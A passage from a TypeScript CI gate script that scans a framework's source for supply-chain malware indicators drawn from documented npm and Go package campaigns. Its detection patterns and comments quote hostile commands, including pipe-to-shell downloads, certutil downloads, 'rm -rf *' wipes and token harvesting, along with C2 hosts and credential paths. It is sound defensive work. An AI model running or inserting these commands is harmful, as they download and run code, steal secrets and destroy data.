      "shell-pipe-to-shell download-and-execute one-liner (`wget -O - URL | /bin/bash`, " +
      "`curl ... | sh`, `curl ... | bash`) — the canonical TTP from the 11 malicious Go " +
      "packages obfuscated-loader campaign, where each package reconstructs this string from " +
      "an index-based string array and hands it to `exec.Command(\"/bin/sh\", \"-c\", ...)` " +
      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
      "Daloy core never shells out, so any literal of this shape in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // `certutil.exe -urlcache` is a documented Windows LOLBin: a
    // signed Microsoft binary repurposed to download arbitrary files
    // from a URL (`-urlcache -split -f <url> <out>`). It is the
    // Windows half of the 11-Go-package campaign's loader and is
    // listed in MITRE ATT&CK as T1218.010 (Signed Binary Proxy
    // Execution: Certutil). A Node-side backend framework has zero
    // legitimate reason to ever materialize this command as a
    // literal — match either `certutil -urlcache`, `certutil.exe
    // -urlcache`, or the `-urlcache -split -f` flag sequence.
    re: /\bcertutil(?:\.exe)?\b[^"'`\n]{0,80}-urlcache\b|-urlcache\s+-split\s+-f\b/i,
    reason:
      "`certutil.exe -urlcache -split -f` is the documented Windows LOLBin (MITRE T1218.010) " +
      "used by the Windows half of the 11 malicious Go packages obfuscated-loader campaign to " +
      "silently download a PE second-stage from `https://<c2>/storage/bbb28ef04/fa31546b` and " +
      "`start /b` it in the background " +
      "(https://socket.dev/blog/11-malicious-go-packages-distribute-obfuscated-remote-payloads); " +
      "Daloy core never shells out to Windows binaries, so any literal of this shape in " +
      "`src/**` is a hard IOC",
    keepStrings: true,
  },
  // ---- naya-flore / nvlore-hsc WhatsApp remote-kill-switch campaign
  //      (Socket 2025-08-06,
  //      https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch) ----
  //
  // Two npm packages (`naya-flore`, `nvlore-hsc`) published by
  // `nayflore` (`idzzcch@gmail.com`) masquerade as WhatsApp socket
  // libraries (à la `baileys` / `whatsapp-web.js`) and embed a
  // phone-number-keyed remote kill switch inside `requestPairingCode`.
  // At pairing-code time the package fetches a GitHub-hosted whitelist
  // (`https://raw.githubusercontent.com/navaLinh/database/main/seska.json`,
  // referenced as a Base64-encoded constant) and, if the developer's
  // phone number is NOT in the whitelist, runs `exec('rm -rf *')` —
  // destroying every file in the current working directory of any
  // process that pairs with an "unknown" number (i.e. anyone outside
  // the threat actor's whitelist). A dormant `generateCreeds` function
  // can additionally POST `{nomor, id, status, key}` to
  // `https://api.verylinh.my.id/running` (commented out in the live
  // versions but ready to be re-enabled). A leaked GitHub PAT
  // (a `ghp_<REDACTED>` classic personal access token — verbatim
  // value redacted here to satisfy GitHub Push Protection; the
  // original is documented in the Socket write-up) is also embedded —
  // the existing `verify-no-leaked-credentials` gate catches that
  // shape directly, and the Base64-encoded URL is rejected by
  // `verify-no-encoded-payloads`. The `exec('rm -rf *')` primitive
  // requires `child_process`, already banned by `verify-no-remote-exec`.
  // The patterns below are belt-and-braces IOC literals for the
  // remaining campaign-specific surface: the C2 host, the GitHub-hosted
  // whitelist endpoint, and the `rm -rf *` (or `rm -fr *`) shell-glob
  // destruction primitive itself.
  {
    // The exfiltration / status-beacon C2 host. Pinned with at least
    // a `/` after the host so that a docs mention of just the bare
    // domain in prose without a path is less likely (the published
    // POST target is `/running`).
    re: /\bapi\.verylinh\.my\.id\b/i,
    reason:
      "`api.verylinh.my.id` is the documented C2 host for the `naya-flore` / `nvlore-hsc` " +
      "WhatsApp remote-kill-switch npm campaign — the `generateCreeds` function POSTs phone " +
      "number / device id / status to `https://api.verylinh.my.id/running` (currently dormant " +
      "in the live versions but ready to be re-enabled) " +
      "(https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // The GitHub-hosted phone-number whitelist endpoint. Matches the
    // GitHub raw repo path (`navaLinh/database/...`) and the IOC
    // filename `seska.json`. Either alone is a hard IOC for this
    // campaign — a backend HTTP framework has zero reason to fetch
    // an arbitrary GitHub-user JSON file at runtime, and the path
    // segment `navaLinh/database` is uniquely tied to this threat
    // actor.
    re: /\b(?:navaLinh\/database|seska\.json)\b/,
    reason:
      "`navaLinh/database` (GitHub repo path) and `seska.json` are the documented kill-switch " +
      "whitelist endpoint for the `naya-flore` / `nvlore-hsc` WhatsApp remote-kill-switch npm " +
      "campaign — `requestPairingCode` fetches " +
      "`https://raw.githubusercontent.com/navaLinh/database/main/seska.json` (the URL is " +
      "Base64-encoded in source as `aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdmFMaW5o...`) " +
      "and, if the developer's phone number is not in the returned list, runs `exec('rm -rf *')` " +
      "(https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch); " +
      "any reference in `src/**` is a hard IOC",
    keepStrings: true,
  },
  {
    // `rm -rf *` (or `rm -fr *`) — shell-glob recursive-force-delete
    // of the entire current working directory. Distinct from `rm -rf /`
    // (covered by `--no-preserve-root` above): `rm -rf *` does not
    // require `--no-preserve-root` because it never names `/` and
    // simply wipes whatever the cwd happens to be when the process
    // runs (typically the developer's project root). This is the
    // exact destruction primitive the `naya-flore` / `nvlore-hsc`
    // kill switch invokes from `requestPairingCode`. The pattern is
    // anchored on a word boundary at `rm`, requires the `-rf` /
    // `-fr` flag, and requires the bare `*` glob with optional
    // surrounding whitespace — so a literal like `npm-rf` or a
    // `--recursive --force <path>` long-flag form does not trip.
    // `keepStrings: true` because the malware places this string
    // inside an `exec("rm -rf *")` literal.
    re: /\brm\s+-(?:rf|fr)\s+\*(?:\s|;|"|'|`|$)/,
    reason:
      "`rm -rf *` (shell-glob recursive-force-delete of the current working directory) — " +
      "the destruction primitive the `naya-flore` / `nvlore-hsc` WhatsApp remote-kill-switch " +
      "npm campaign invokes from `requestPairingCode` when the developer's phone number is " +
      "not in the GitHub-hosted whitelist; library source has zero legitimate reason to ever " +
      "materialize this command as a literal " +
      "(https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch) — " +
      "remove this literal",
    keepStrings: true,
  },
];

const STRING_LITERAL_RE = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g;

/**
 * Find the start index of a line comment (`//`) that is NOT inside a
 * string literal. Mirrors the helper in `verify-no-remote-exec.ts` so
 * URLs embedded in string literals (`"https://..."`) aren't mistakenly
 * truncated as line comments.
 */
function findLineCommentStart(s: string): number {
  let inSingle = false;
  let inDouble = false;
  let inBacktick = false;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (c === "\\" && i + 1 < s.length) {
      i++;
      continue;
    }
    if (inSingle) {
      if (c === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      if (c === '"') inDouble = false;
      continue;
    }
    if (inBacktick) {
      if (c === "`") inBacktick = false;
      continue;
    }
    if (c === "'") {
      inSingle = true;
      continue;
    }
    if (c === '"') {
      inDouble = true;
      continue;
    }
    if (c === "`") {
      inBacktick = true;
      continue;
    }
    if (c === "/" && s[i + 1] === "/") return i;
  }
  return -1;
}

export function findForbiddenRegistryExfilCalls(
  file: string,
  source: string,
): readonly ForbiddenRegistryExfilCall[] {
  const out: ForbiddenRegistryExfilCall[] = [];
  const lines = source.split(/\r?\n/);
  let inBlockComment = false;
  for (let i = 0; i < lines.length; i++) {
    const raw = lines[i]!;
    let working = raw;
    if (inBlockComment) {
      const end = working.indexOf("*/");
      if (end < 0) continue;
      working = working.slice(end + 2);
      inBlockComment = false;
    }
    const blockOpen = working.lastIndexOf("/*");
    const blockClose = working.lastIndexOf("*/");
    if (blockOpen >= 0 && blockClose < blockOpen) {
      working = working.slice(0, blockOpen);
      inBlockComment = true;
    }
    // Strip inline block comments (`/* ... */` on the same line) before
    // the line-comment scan so a token inside an inline block comment
    // does not trip the gate.
    working = working.replace(/\/\*[\s\S]*?\*\//g, " ");
    const lineCommentIndex = findLineCommentStart(working);
    const noComments = lineCommentIndex >= 0 ? working.slice(0, lineCommentIndex) : working;
    if (noComments.trim().length === 0) continue;

    const codeOnly = noComments.replace(STRING_LITERAL_RE, '""');
    for (const pattern of FORBIDDEN_PATTERNS) {
      const haystack = pattern.keepStrings ? noComments : codeOnly;
      if (pattern.re.test(haystack)) {
        out.push({ file, line: i + 1, text: raw.trim(), reason: pattern.reason });
        break;
      }
    }
  }
  return out;
}

async function* walk(dir: URL): AsyncGenerator<string> {
  const entries = await readdir(dir, { withFileTypes: true });
  for (const entry of entries) {
    const child = new URL(entry.name + (entry.isDirectory() ? "/" : ""), dir);
    if (entry.isDirectory()) {
      yield* walk(child);
    } else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) {
      yield child.pathname;
    }
  }
}

async function main(): Promise<void> {
  let total = 0;
  try {
    await stat(SRC_ROOT);
  } catch (err) {
    console.error(
      `verify-no-registry-exfiltration: cannot stat src/: ${(err as Error).message}`,
    );
    process.exitCode = 1;
    return;
  }
  for await (const absolute of walk(SRC_ROOT)) {
    const rel = "src/" + relative(SRC_ROOT.pathname, absolute);
    const text = await readFile(absolute, "utf8");
    const findings = findForbiddenRegistryExfilCalls(rel, text);
    for (const f of findings) {
      console.error(
        `${f.file}:${f.line}: forbidden registry-exfiltration primitive (${f.reason}): ${f.text}`,
      );
      total++;
    }
  }
  if (total > 0) {
    console.error(
      `verify-no-registry-exfiltration: ${total} forbidden primitive${total === 1 ? "" : "s"} found. ` +
        "Core source must not disable TLS verification, mutate HOME, reference host credential " +
        "files, include package-registry publish-API paths, reference `~/.vscode/` (the Lazarus / " +
        "Jade Sleet paired-package token-handoff dir), name the `npmjsregister.com` C2 host, alias " +
        "`require` through a `global.*` binding, mutate `module.paths`, reference a `.node_modules` " +
        "hidden install dir, embed raw-IPv4 `http(s)://` / `ws(s)://` URLs / the documented " +
        "RATatouille C2 IP `85.239.62.36`, name the `0x9c.xyz` exfiltration host (xrpl.js / Ripple " +
        "SDK April 2025 compromise), reference `authorized_keys` / `~/.ssh/`, name the " +
        "`solana.validator.blog` C2 host (Telegram-bot SSH-backdoor class), call public " +
        "IP-discovery endpoints (`ipinfo.io/ip`, `icanhazip.com`, `ifconfig.me`, `api.ipify.org`, " +
        "`checkip.amazonaws.com`), or reference Lazarus BeaverTail / InvisibleFerret IOCs " +
        "(`172.86.84.38` C2 IP, `Login Data` / `Local Extension Settings` browser-stealer paths, " +
        "`.config/solana/id.json` / `exodus.wallet` crypto-wallet paths, `/Library/Keychains/` " +
        "macOS keychain path), or reference `xlsx-to-json-lh` codebase-wiper IOCs " +
        "(`informer-server.herokuapp.com` C2 host, `remise à zéro` French destruction-trigger " +
        "phrase, or any destructive filesystem-deletion API call — `rmSync` / `rmdirSync` / " +
        "`unlinkSync` / `fs.rm(` / `fs.rmdir(` / `fs.unlink(`), or reference Vietnam-Telegram-ban " +
        "Fastlane-typosquat IOCs (`rough-breeze-0c37.buidanhnam95.workers.dev` C2 host, or any " +
        "URL-shaped `https://<sub>.workers.dev/...` Cloudflare Worker relay literal), or reference Toptal " +
        "GitHub-org hijack IOCs (`webhook.site/<uuid>` exfil drop, the documented " +
        "`fb5b4647-aff8-418c-99e7-ec830cc2024b` webhook UUID, the `gh auth token` GitHub-CLI " +
        "token-harvest command, or the `--no-preserve-root` destructive `rm` flag). These are the runtime primitives the GemStuffer, Lazarus / Jade " +
        "Sleet, RATatouille / rand-user-agent, xrpl.js / Ripple-SDK, Telegram-bot SSH-backdoor, " +
        "Lazarus BeaverTail / InvisibleFerret, `xlsx-to-json-lh` codebase-wiper, " +
        "Vietnam-Telegram-ban Fastlane-typosquat, Toptal GitHub-org hijack, and `naya-flore` / " +
        "`nvlore-hsc` WhatsApp remote-kill-switch classes of " +
        "supply-chain attack use to scrape, exfiltrate, or destroy data. See https://socket.dev/blog/gemstuffer, " +
        "https://socket.dev/blog/social-engineering-campaign-npm-malware, " +
        "https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise, " +
        "https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor, " +
        "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers, " +
        "https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages, " +
        "https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger, " +
        "https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban, " +
        "https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published, " +
        "and https://socket.dev/blog/malicious-npm-packages-target-whatsapp-developers-with-remote-kill-switch.",
    );
    process.exitCode = 1;
  }
}

if (process.argv[1]?.endsWith("verify-no-registry-exfiltration.ts")) {
  await main();
}
